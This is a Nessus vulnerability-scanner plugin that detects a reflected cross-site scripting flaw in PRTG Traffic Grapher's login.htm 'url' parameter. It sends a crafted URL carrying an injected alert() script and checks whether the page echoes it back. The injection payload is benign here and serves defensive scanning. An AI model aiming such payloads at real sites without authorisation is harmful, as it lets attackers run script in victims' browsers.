
# (C) Tenable Network Security, Inc.
#

include('compat.inc');

if (description)
{
  script_id(46857);
  script_version("$Revision: 1.9 $");
  script_cvs_date("$Date: 2015/09/24 23:21:20 $");

  script_bugtraq_id(40630);

  script_name(english:"PRTG Traffic Grapher login.htm url Parameter XSS");
  script_summary(english:"Attempts a non-persistent XSS attack");

  script_set_attribute(attribute:"synopsis", value:
"A network traffic monitoring application on the remote host has a
cross-site scripting vulnerability.");

  script_set_attribute(attribute:"description", value:
"The version of PRTG Traffic Grapher hosted on the remote web server
is affected by a cross-site scripting vulnerability in the 'url'
parameter of the 'login.htm' script.

An unauthenticated, remote attacker may be able to exploit this flaw to
inject arbitrary HTML and script code in a user's browser.");

  script_set_attribute(attribute:"see_also", value:"http://www.aushack.com/201006-prtg.txt");
  script_set_attribute(attribute:"see_also", value:"http://www.securityfocus.com/archive/1/511703/30/0/threaded");
  script_set_attribute(attribute:"solution", value:"Upgrade to PRTG Traffic Grapher 6.2.1.963 / 6.2.1.964 or later.");
 script_set_cvss_base_vector("CVSS2#AV:N/AC:M/Au:N/C:N/I:P/A:N");
 script_set_cvss_temporal_vector("CVSS2#E:F/RL:OF/RC:C");
 script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
 script_set_attribute(attribute:"exploit_available", value:"true");
 script_cwe_id(20, 74, 79, 442, 629, 711, 712, 722, 725, 750, 751, 800, 801, 809, 811, 864, 900, 928, 931, 990);

  script_set_attribute(attribute:"vuln_publication_date", value:"2010/06/08");
  script_set_attribute(attribute:"patch_publication_date", value:"2009/01/08");
  script_set_attribute(attribute:"plugin_publication_date", value:"2010/06/10");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses : XSS");

  script_copyright(english:"This script is Copyright (C) 2010-2015 Tenable Network Security, Inc.");

  script_dependencies("prtg_traffic_grapher_detect.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);
  script_require_keys("www/prtg_traffic_grapher");

  exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("webapp_func.inc");
include("url_func.inc");

port = get_http_port(default:80);
install = get_install_from_kb(appname:'prtg_traffic_grapher', port:port, exit_on_fail:TRUE);

payload = SCRIPT_NAME + unixtime();
exploit = '<script>alert(\'' + payload + '\')</script>';

url = '/login.htm?url='+urlencode(str:'">'+exploit);

res = http_send_recv3(
  method:"GET",
  item:url,
  port:port,
  follow_redirect:2,
  exit_on_fail:TRUE
);
if (
  '<A title="PRTG Traffic Grapher' >< res[2] &&
  '<form id=login action="">'+exploit+'" method="post">' >< res[2]
)
{
  set_kb_item(name:'www/'+port+'/XSS', value:TRUE);
  if (report_verbosity > 0)
  {
    report =
      '\n' +
      'Nessus was able to exploit the issue using the following URL : ' +
      '\n' +
      '\n' + build_url(port:port, qs:url);
    security_warning(port:port, extra:report);
  }
  else security_warning(port);
  exit(0);
}
else
{
  install_url = build_url(qs:install['dir']+'/', port:port);
  exit(0, "The PRTG Traffic Grapher install at " + install_url + " is not affected.");
}
